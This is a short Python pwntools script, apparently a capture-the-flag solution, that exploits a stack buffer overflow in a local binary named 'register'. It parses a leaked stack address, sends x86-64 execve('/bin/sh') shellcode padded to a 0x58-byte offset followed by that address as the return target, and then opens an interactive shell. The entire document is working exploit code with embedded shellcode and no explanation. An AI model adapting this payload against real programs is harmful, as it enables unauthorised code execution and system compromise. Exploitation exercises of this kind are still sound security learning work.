from pwn import p64,process
p= process('./register/register')
p.recvuntil(b'at ')
addr=p.recvuntil(b'.')[:-1]
addr_nr= int(addr.decode(),16)
print(addr)
p.recv()

off=0x58
payload=b''
payload+= b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload+= b'A'* (off-len(payload))
payload+= p64(addr_nr)
print(payload)
p.sendline(payload)
p.interactive()